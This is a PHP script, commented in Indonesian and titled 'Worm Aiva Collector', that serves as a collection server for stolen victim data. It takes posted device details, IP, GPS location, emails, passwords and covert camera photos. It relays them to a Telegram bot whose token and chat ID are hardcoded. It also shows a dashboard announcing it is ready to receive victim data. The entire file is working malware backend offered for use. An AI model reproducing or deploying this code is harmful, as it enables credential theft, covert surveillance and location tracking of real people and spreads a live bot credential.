<?php
// ============================================
// WORM AIVA COLLECTOR — GITHUB VERSION
// ============================================

// GitHub Pages hanya support static HTML
// TAPI kita bisa pakai 3rd party service untuk backend

// Kirim data ke Telegram (GRATIS, MUDAH)
// https://t.me/BotFather

$botToken = '8806813025:AAFUuyClrFAKIaOn8muWbbraedaynTOisS0'; // GANTI DENGAN TOKEN BOT TELEGRAM KAMU
$chatId = '412176517'; // GANTI DENGAN CHAT ID KAMU

$input = file_get_contents('php://input');
$data = json_decode($input, true);

if ($data) {
    // Format pesan untuk Telegram
    $message = "🔴 NEW VICTIM!\n\n";
    $message .= "🆔 ID: " . ($data['victimId'] ?? 'unknown') . "\n";
    $message .= "📱 Device: " . ($data['deviceName'] ?? 'unknown') . "\n";
    $message .= "🔧 Chipset: " . ($data['chipset'] ?? 'unknown') . "\n";
    $message .= "💻 OS: " . ($data['os'] ?? 'unknown') . "\n";
    $message .= "🌐 IP: " . ($data['ip'] ?? 'unknown') . "\n";
    $message .= "📍 Location: " . ($data['location'] ? $data['location']['lat'] . ', ' . $data['location']['lng'] : 'unknown') . "\n";
    $message .= "📧 Emails: " . implode(', ', ($data['emails'] ?? [])) . "\n";
    $message .= "🔑 Passwords: " . count($data['passwords'] ?? []) . " found\n";
    $message .= "📸 Photo: " . ($data['photo'] ? 'YES' : 'NO') . "\n";
    $message .= "⏰ Time: " . ($data['timestamp'] ?? 'unknown') . "\n";
    $message .= "🌐 URL: " . ($data['url'] ?? 'unknown') . "\n";
    $message .= "\n📦 Full data attached.";

    // Kirim ke Telegram
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $dataTele = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($dataTele)
        ]
    ];
    
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    
    // Kirim foto jika ada
    if (isset($data['photo']) && $data['photo'] && strpos($data['photo'], 'data:image') === 0) {
        $photoData = str_replace('data:image/jpeg;base64,', '', $data['photo']);
        $photoData = str_replace(' ', '+', $photoData);
        
        $urlPhoto = "https://api.telegram.org/bot{$botToken}/sendPhoto";
        $dataPhoto = [
            'chat_id' => $chatId,
            'photo' => base64_decode($photoData),
            'caption' => '📸 Photo from victim: ' . ($data['deviceName'] ?? 'unknown')
        ];
        
        // Simpan foto dulu
        $tempFile = tempnam(sys_get_temp_dir(), 'photo_') . '.jpg';
        file_put_contents($tempFile, base64_decode($photoData));
        
        $postFields = [
            'chat_id' => $chatId,
            'photo' => new CURLFile($tempFile),
            'caption' => '📸 Photo from victim: ' . ($data['deviceName'] ?? 'unknown')
        ];
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $urlPhoto);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
        
        unlink($tempFile);
    }
    
    http_response_code(200);
    echo 'ok';
} else {
    // Dashboard sederhana
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Worm Aiva Collector</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { background: #0a0a0a; color: #00ff41; font-family: monospace; padding: 20px; text-align: center; }
            .box { border: 1px solid #00ff41; padding: 30px; border-radius: 10px; max-width: 500px; margin: 50px auto; }
            .status { color: #00ff41; font-size: 20px; }
            .info { color: #666; font-size: 14px; margin: 20px 0; }
            .btn { background: #00ff41; color: #0a0a0a; padding: 10px 20px; border: none; cursor: pointer; border-radius: 5px; font-weight: bold; }
            .btn:hover { background: #00cc33; }
        </style>
    </head>
    <body>
        <div class="box">
            <h1>𓆙 WORM AIVA</h1>
            <div class="status">✅ ONLINE</div>
            <div class="info">
                Server siap menerima data korban.<br>
                Data akan dikirim ke Telegram bot.
            </div>
            <div class="info">
                <small>📱 Total victims: <span id="count">0</span></small>
            </div>
        </div>
        <script>
            // Cek status dari Telegram
            async function checkStatus() {
                // Bisa diisi dengan logika cek status
            }
            setInterval(checkStatus, 10000);
        </script>
    </body>
    </html>
    <?php
}
?>
